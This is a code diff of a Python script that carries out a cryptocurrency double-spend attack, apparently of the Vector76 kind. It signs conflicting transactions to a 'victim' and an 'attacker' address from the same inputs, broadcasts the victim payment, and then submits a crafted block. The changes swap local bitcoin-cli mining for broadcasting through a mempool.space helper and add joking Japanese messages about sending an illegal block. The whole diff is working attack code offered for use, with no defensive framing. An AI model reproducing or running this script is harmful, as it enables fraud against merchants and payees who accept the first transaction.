@@ -91,7 +91,6 @@ def broadcast_mempool_space(raw_tx, testnet):
     else:
         print(f"Failed to broadcast transaction. Status code: {response.status_code}")
 
-
 args = parser.parse_args()
 fake_send_from   = args.from_wifkey
 victim_address   = args.send_to
@@ -101,19 +100,10 @@ testnet    = args.is_testnet
 coin_symbol = args.symbol
 fee = to_satoshi(args.fee)
 
-def generate_block(transaction_info):
-    return subprocess.run(f"bitcoin-cli generateblock {attacker_address} \"[\"{transaction_info}\"]\" false",
-                   shell=True,
-                   stdout=subprocess.PIPE).stdout
-
-def submit_block(block):
-    return subprocess.run(f"bitcoin-cli submitblock '{block}'",
-                   shell=True,
-                   stdout=subprocess.PIPE).stdout
-
-port     = 8332
 if testnet:
     print("testnet mode")
+port     = 8332
+if testnet:
     port     = 18332 # testnet ltc port
 
 if "ltc" == coin_symbol:
@@ -152,11 +142,11 @@ send_amount = to_satoshi(amount_btc)
 tx_victim   = [{"address": victim_address, "value": send_amount}]
 tx_attacker = [{"address": attacker_address, "value": send_amount}]
 
-tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee + 2500)
+tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
 tx_victim   = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
 
 tx_attacker = transaction_util.sign(tx_attacker, 0, fake_send_from)
-tx_victim   = transaction_util.sign(tx_victim,0, fake_send_from)
+tx_victim   = transaction_util.sign(tx_victim, 0, fake_send_from)
 #tx_victim   = cryptos.serialize(transaction_util.signall(tx_victim, fake_send_from))
 tx_victim   = cryptos.serialize(tx_victim)
 tx_attacker = cryptos.serialize(tx_attacker)
@@ -167,8 +157,6 @@ block = cryptos.serialize(block)
 #vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 #vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 
-mined_block = generate_block(block)
-print(mined_block)
 print()
 print("[+] READY...")
 print()
@@ -192,15 +180,15 @@ input("--- Are you sure you want to continue? Press Enter to continue. ---")
 print("Sending victim Transaction ...")
 
 broadcast_transaction(tx_victim, testnet)
-input("--- Send the second transaction after pressing the enter key. --- ")
 print("Index > 強固なブロックチェーン技術に対して強制干渉を開始...")
 print()
-time.sleep(1)
+time.sleep(1) #詠唱中.... -u-
 print("SND IBLK TOBC  (不正なブロックを、ブロックチェーンに送信!)")
-time.sleep(0.5)
+time.sleep(1) #ラグ作り 0u0
 print()
 #txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=fee)#broadcast_transaction(tx_attacker, testnet)
-submit_block(mined_block)
+broadcast_mempool_space(block, testnet)
+#broadcast_mempool_space(tx_attacker, testnet)
 #txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=fee)
 print()
 #print()
